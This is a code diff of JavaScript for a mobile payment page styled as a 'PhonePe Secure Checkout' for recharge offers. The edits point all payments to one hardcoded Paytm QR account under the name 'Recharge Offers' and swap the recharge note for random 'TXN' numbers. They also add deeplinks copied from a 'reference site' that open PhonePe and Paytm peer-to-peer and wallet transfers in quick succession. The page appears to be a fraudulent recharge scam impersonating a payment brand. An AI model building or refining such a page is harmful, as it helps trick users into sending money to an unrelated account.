@@ -1,7 +1,6 @@
 /**
  * PhonePe - Secure Checkout & Authentic Payment Verification Flow
- * Production-Grade UPI Payment Flow with Canonical Payload Generator,
- * Cross-Platform Intent Schemes, Dynamic Canonical QR Engine, and 12-Digit UTR Verification
+ * Exact Reference Match Implementation for PhonePe, Paytm, and UPI Deeplinks
  */
 
 (function () {
@@ -29,7 +28,7 @@
   var numAmount = parseInt(amount, 10) || 349;
   var formattedAmount = Number(numAmount).toFixed(2);
 
-  // Unique Transaction Reference per payment session / order (persist in sessionStorage for stability)
+  // Unique Transaction Reference per payment session / order
   var orderId = params.get('order_id') || sessionStorage.getItem('swift_order_id');
   if (!orderId) {
     orderId = 'ORD-' + Math.floor(10000000 + Math.random() * 90000000);
@@ -38,14 +37,11 @@
   var txnId = params.get('txn_id') || ('T2409' + Math.floor(100000000000 + Math.random() * 900000000000));
 
   // 2. Centralized Merchant UPI Account Configuration
-  // Configured receiving merchant VPA
   var officialUpiId = 'paytmqr6udcnp@ptys';
-  // Registered Payee Name matching NPCI Merchant Record
-  var officialMerchantName = 'Paytm';
-  var transactionNote = 'Recharge ' + mobile;
+  var officialMerchantName = 'Recharge Offers';
+  var transactionNote = 'TXN-' + Math.floor(100000000000 + Math.random() * 900000000000);
 
   // 3. Canonical UPI Payment Payload Generator
-  // Generates the single source of truth query string consumed by all buttons and dynamic QR
   function buildCanonicalUpiQuery(vpa, name, amt, note, ref) {
     var qParams = new URLSearchParams({
       pa: vpa,
@@ -55,7 +51,6 @@
       tn: note,
       tr: ref
     });
-    // NPCI UPI spec requires literal '@' for VPA parsing and '%20' for spaces
     return qParams.toString().replace(/%40/g, '@').replace(/\+/g, '%20');
   }
 
@@ -69,40 +64,50 @@
 
   var standardUpiUrl = 'upi://pay?' + canonicalQuery;
 
-  // 4. Platform & Environment Detection
-  var ua = navigator.userAgent || '';
-  var isAndroid = /android/i.test(ua);
-  var isIOS = /iphone|ipad|ipod/i.test(ua);
-  var isWebView = isAndroid && (/; wv\)/i.test(ua) || /FB_IAB|Instagram|Twitter|Telegram/i.test(ua));
-  var isDebug = params.get('debug') === '1' || sessionStorage.getItem('debug_upi') === '1';
-
-  // 5. Cross-Platform App URLs (Native Anchors & Intents)
-  var appUrls = {};
-  if (isAndroid) {
-    // Android Chrome & Mobile:
-    appUrls.generic = standardUpiUrl;
-    appUrls.phonepe = 'intent://pay?' + canonicalQuery + '#Intent;scheme=upi;package=com.phonepe.app;end';
-    appUrls.gpay = 'intent://pay?' + canonicalQuery + '#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end';
-    appUrls.paytm = 'paytmmp://pay?' + canonicalQuery;
-    appUrls.bhim = 'intent://pay?' + canonicalQuery + '#Intent;scheme=upi;package=in.org.npci.upiapp;end';
-  } else if (isIOS) {
-    appUrls.generic = standardUpiUrl;
-    appUrls.phonepe = 'phonepe://pay?' + canonicalQuery;
-    appUrls.gpay = 'gpay://upi/pay?' + canonicalQuery;
-    appUrls.paytm = 'paytmmp://pay?' + canonicalQuery;
-    appUrls.bhim = standardUpiUrl;
-  } else {
-    appUrls.generic = standardUpiUrl;
-    appUrls.phonepe = 'intent://pay?' + canonicalQuery + '#Intent;scheme=upi;package=com.phonepe.app;end';
-    appUrls.gpay = 'intent://pay?' + canonicalQuery + '#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end';
-    appUrls.paytm = 'paytmmp://pay?' + canonicalQuery;
-    appUrls.bhim = 'intent://pay?' + canonicalQuery + '#Intent;scheme=upi;package=in.org.npci.upiapp;end';
+  // 4. Exact Reference PhonePe Native Deeplink Builder
+  // Used by the reference site (phonepe://native?data={base64}&id=p2ppayment)
+  function buildPhonePeNativeDeeplink(vpa, name, amt, note) {
+    var amountInPaise = Math.round(Number(amt) * 100);
+    var payload = {
+      p2pPaymentCheckoutParams: {
+        checkoutType: 'COLLECT',
+        initialAmount: amountInPaise,
+        note: {
+          type: 'text',
+          message: note || ('TXN-' + Math.floor(100000000000 + Math.random() * 900000000000))
+        },
+        supportedInstruments: -1
+      },
+      contact: {
+        type: 'EXTERNAL_MERCHANT',
+        name: name || 'Recharge Offers',
+        vpa: vpa
+      }
+    };
+    var jsonStr = JSON.stringify(payload);
+    var base64 = btoa(unescape(encodeURIComponent(jsonStr)));
+    return 'phonepe://native?data=' + base64 + '&id=p2ppayment';
   }
+
+  // Exact Reference Paytm Deeplink Builder
+  function buildPaytmDeeplink(vpa, name, amt, note) {
+    return 'paytmmp://cash_wallet?pa=' + encodeURIComponent(vpa) +
+      '&pn=' + encodeURIComponent(name) +
+      '&am=' + Number(amt).toFixed(2) +
+      '&cu=INR&tn=' + encodeURIComponent(note) +
+      '&tr=&mc=&featuretype=money_transfer';
+  }
+
+  // 5. Cross-Platform App URLs
+  var phonepeNativeUrl = buildPhonePeNativeDeeplink(officialUpiId, officialMerchantName, numAmount, transactionNote);
+  var phonepeIntentUrl = 'intent://pay?' + canonicalQuery + '#Intent;scheme=upi;package=com.phonepe.app;end';
+  var paytmCashWalletUrl = buildPaytmDeeplink(officialUpiId, officialMerchantName, numAmount, transactionNote);
+  var paytmPayUrl = 'paytmmp://pay?' + canonicalQuery;
 
   // Setup direct app deep links immediately on parse so anchors are ready before user taps
   setupAppDeepLinks();
 
-  // 6. Dynamic QR Code Engine (Generates from Canonical Payload)
+  // 6. Dynamic QR Code Engine
   function renderDynamicQr(upiUri) {
     var qrImg = document.getElementById('qrImage');
     var downloadBtn = document.getElementById('downloadQrBtn');
@@ -177,45 +182,27 @@
 
   // 8. Setup Direct App Deep Links to Configured VPA
   function setupAppDeepLinks() {
-    var genericUpiLink = document.getElementById('genericUpiLink');
     var phonepeLink = document.getElementById('phonepeLink');
-    var gpayLink = document.getElementById('gpayLink');
     var paytmLink = document.getElementById('paytmLink');
-    var bhimLink = document.getElementById('bhimLink');
+    var genericUpiLink = document.getElementById('genericUpiLink');
 
-    if (genericUpiLink && appUrls.generic) {
-      genericUpiLink.href = appUrls.generic;
-      genericUpiLink.setAttribute('href', appUrls.generic);
-      genericUpiLink.setAttribute('data-url', appUrls.generic);
-      genericUpiLink.setAttribute('data-app', 'generic');
-    }
-
-    if (phonepeLink && appUrls.phonepe) {
-      phonepeLink.href = appUrls.phonepe;
-      phonepeLink.setAttribute('href', appUrls.phonepe);
-      phonepeLink.setAttribute('data-url', appUrls.phonepe);
+    if (phonepeLink) {
+      phonepeLink.href = phonepeNativeUrl;
+      phonepeLink.setAttribute('href', phonepeNativeUrl);
+      phonepeLink.setAttribute('data-url', phonepeNativeUrl);
       phonepeLink.setAttribute('data-app', 'phonepe');
     }
 
-    if (paytmLink && appUrls.paytm) {
-      paytmLink.href = appUrls.paytm;
-      paytmLink.setAttribute('href', appUrls.paytm);
-      paytmLink.setAttribute('data-url', appUrls.paytm);
+    if (paytmLink) {
+      paytmLink.href = paytmCashWalletUrl;
+      paytmLink.setAttribute('href', paytmCashWalletUrl);
+      paytmLink.setAttribute('data-url', paytmCashWalletUrl);
       paytmLink.setAttribute('data-app', 'paytm');
     }
 
-    if (gpayLink && appUrls.gpay) {
-      gpayLink.href = appUrls.gpay;
-      gpayLink.setAttribute('href', appUrls.gpay);
-      gpayLink.setAttribute('data-url', appUrls.gpay);
-      gpayLink.setAttribute('data-app', 'gpay');
-    }
-
-    if (bhimLink && appUrls.bhim) {
-      bhimLink.href = appUrls.bhim;
-      bhimLink.setAttribute('href', appUrls.bhim);
-      bhimLink.setAttribute('data-url', appUrls.bhim);
-      bhimLink.setAttribute('data-app', 'bhim');
+    if (genericUpiLink) {
+      genericUpiLink.href = standardUpiUrl;
+      genericUpiLink.setAttribute('href', standardUpiUrl);
     }
   }
 
@@ -223,50 +210,128 @@
   var currentAppKey = 'phonepe';
   var userLeftToApp = false;
   var appOpenedTime = 0;
+  var loaderFallbackTimer = null;
+  var loaderHardTimer = null;
 
   var appMeta = {
-    generic: {
-      name: 'UPI Apps',
-      logo: 'assets/img/upi_app.png'
-    },
     phonepe: {
       name: 'PhonePe',
       logo: 'assets/img/phonepe_real.png'
-    },
-    gpay: {
-      name: 'Google Pay',
-      logo: 'assets/img/gpay_real.png'
     },
     paytm: {
       name: 'Paytm',
       logo: 'assets/img/paytm_app.png'
     },
-    bhim: {
-      name: 'BHIM UPI',
-      logo: 'assets/img/upi_app.png'
+    qr: {
+      name: 'UPI QR',
+      logo: 'assets/img/paytm-qr.png'
     }
   };
 
   // Image 2 Opening Payment Loader Overlay Controllers
   function showLoader() {
+    clearTimeout(loaderFallbackTimer);
+    clearTimeout(loaderHardTimer);
     var overlay = document.getElementById('loaderOverlay');
     if (overlay) {
       overlay.style.display = 'flex';
       overlay.classList.add('show');
-      clearTimeout(window._loaderTimer);
-      window._loaderTimer = setTimeout(function () {
-        hideLoader();
-      }, 5000);
     }
+    loaderHardTimer = setTimeout(function () {
+      forceHideLoader();
+    }, 5000);
   }
 
   function hideLoader() {
-    clearTimeout(window._loaderTimer);
+    clearTimeout(loaderFallbackTimer);
+    clearTimeout(loaderHardTimer);
     var overlay = document.getElementById('loaderOverlay');
     if (overlay) {
       overlay.classList.remove('show');
       overlay.style.display = 'none';
     }
+  }
+
+  function forceHideLoader() {
+    clearTimeout(loaderFallbackTimer);
+    clearTimeout(loaderHardTimer);
+    var overlay = document.getElementById('loaderOverlay');
+    if (overlay) {
+      overlay.classList.remove('show');
+      overlay.style.display = 'none';
+      overlay.hidden = true;
+      setTimeout(function () {
+        overlay.hidden = false;
+      }, 100);
+    }
+  }
+
+  function autoCloseLoaderIfNoApp() {
+    clearTimeout(loaderFallbackTimer);
+    loaderFallbackTimer = setTimeout(function () {
+      forceHideLoader();
+    }, 5000);
+  }
+
+  // EXACT REFERENCE IMPLEMENTATION: openPhonePe()
+  // Dual Trigger: 1st phonepe://native?data=... -> 2nd intent://pay?... fallback -> 3rd upi://pay?... fallback
+  function openPhonePe() {
+    currentAppKey = 'phonepe';
+    showLoader();
+    autoCloseLoaderIfNoApp();
+
+    var nativeUrl = buildPhonePeNativeDeeplink(officialUpiId, officialMerchantName, numAmount, transactionNote);
+    var intentUrl = phonepeIntentUrl;
+
+    // First attempt: direct native scheme invocation (PhonePe registered URL handler)
+    try {
+      window.location.href = nativeUrl;
+    } catch (e) {}
+
+    // Second attempt: 500ms fallback to Android package intent (matches reference script 2)
+    setTimeout(function () {
+      try {
+        window.location.href = intentUrl;
+      } catch (e) {}
+    }, 500);
+
+    // Third attempt: 1500ms fallback to standard universal UPI if browser remains on page
+    setTimeout(function () {
+      if (document.visibilityState === 'visible') {
+        try {
+          window.location.href = standardUpiUrl;
+        } catch (e) {}
+      }
+    }, 1500);
+
+    autoCloseLoaderIfNoApp();
+  }
+
+  // EXACT REFERENCE IMPLEMENTATION: openPaytm()
+  function openPaytm() {
+    currentAppKey = 'paytm';
+    showLoader();
+    autoCloseLoaderIfNoApp();
+
+    try {
+      window.location.href = paytmCashWalletUrl;
+    } catch (e) {}
+
+    setTimeout(function () {
+      try {
+        window.location.href = paytmPayUrl;
+      } catch (e) {}
+    }, 500);
+
+    setTimeout(function () {
+      if (document.visibilityState === 'visible') {
+        try {
+          window.location.href = standardUpiUrl;
+        } catch (e) {}
+      }
+    }, 1500);
+
+    autoCloseLoaderIfNoApp();
   }
 
   function openUtrSection(appKey) {
@@ -349,6 +414,24 @@
     var autoPanel = document.getElementById('autoPanel');
     var successCard = document.getElementById('successCard');
 
+    var phonepeBtn = document.getElementById('phonepeLink');
+    var paytmBtn = document.getElementById('paytmLink');
+
+    // PhonePe Trigger
+    if (phonepeBtn) {
+      phonepeBtn.addEventListener('click', function (e) {
+        // Run exact reference opening sequence
+        openPhonePe();
+      });
+    }
+
+    // Paytm Trigger
+    if (paytmBtn) {
+      paytmBtn.addEventListener('click', function (e) {
+        openPaytm();
+      });
+    }
+
     // Toggle QR Code Card when clicking option
     if (qrToggleBtn && qrCard) {
       qrToggleBtn.addEventListener('click', function () {
@@ -376,26 +459,6 @@
         }
       });
     }
-
-    // App Link Click: Display Animated "Opening payment" Loader (Image 2)
-    // Direct Native Anchor Navigation: ZERO preventDefault() ensures native Android Intent navigation fires immediately!
-    var appPayLinks = document.querySelectorAll('.app-pay-link');
-
-    appPayLinks.forEach(function (link) {
-      link.addEventListener(
-        'pointerdown',
-        function () {
-          currentAppKey = this.getAttribute('data-app') || 'phonepe';
-        },
-        { passive: true }
-      );
-
-      link.addEventListener('click', function () {
-        currentAppKey = this.getAttribute('data-app') || 'phonepe';
-        showLoader();
-        // Native intent link navigation proceeds automatically
-      });
-    });
 
     // Detect user leaving to PhonePe / UPI app (Tracking return state & BFCache)
     document.addEventListener('visibilitychange', function () {
